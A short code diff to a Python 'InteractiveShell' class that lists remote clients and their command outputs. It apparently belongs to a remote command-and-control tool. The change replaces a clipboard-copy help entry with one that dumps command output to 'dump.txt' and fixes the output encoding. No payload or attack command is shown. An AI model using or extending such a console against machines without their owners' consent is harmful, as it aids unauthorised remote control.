@@ -50,7 +50,8 @@ class InteractiveShell(object):
         t.add_row(['com <id>', 'Displays a specific command and output for the current client'])
         t.add_row(['comk', 'Kills a command ("*" for all)'])
         t.add_row(['clik', 'Kills a client ("*" for all)'])
-        t.add_row(['copy <id>', 'Copies the command output to clipboard'])
+        # t.add_row(['copy <id>', 'Copies the command output to clipboard'])
+        t.add_row(['dump <id>', 'Dumps the command output to disk - "dump.txt"'])
         print(t)
 
     def select_client(self, selected_id):
@@ -178,7 +179,7 @@ class InteractiveShell(object):
         c = Command.query.filter_by(rel_client_id=self.current_client_id, id=command_id).first()
 
         with open('dump.txt', 'w') as f:
-            f.write(beautify(c.output))
+            f.write(beautify(str(c.output.encode('utf-8', 'ignore'))))
 
         print('Command {} was dumped to "dump.txt"'.format(command_id))
 
